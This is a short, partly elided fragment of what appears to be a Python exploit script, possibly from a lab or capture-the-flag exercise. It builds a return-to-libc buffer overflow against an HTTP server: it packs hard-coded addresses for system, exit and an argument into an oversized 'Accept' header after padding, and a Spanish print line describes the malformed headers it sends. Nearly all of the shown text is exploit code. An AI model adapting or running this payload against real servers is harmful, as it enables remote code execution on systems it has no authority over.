...
#Memory Addresses
systemAddr = pack("<L",0xb7311200)
exitAddr = pack("<L",0xb73043d0)
arg1Addr = pack("<L",0xb74520cf)
...
message += "Accept: " + "ABCDEFGHIJKLMNOPQRSTUVWXYZ01" +  systemAddr +  exitAddr +  arg1Addr + "\r\n" \
...
#Print explanation
print ("Este solo envia 32 header con 'Accept: A*62' y 1 con 'Accept: ABCDEFGHIJKLMNOPQRSTUVWXYZ0011223456789AAAAAAA4444333322221111'")
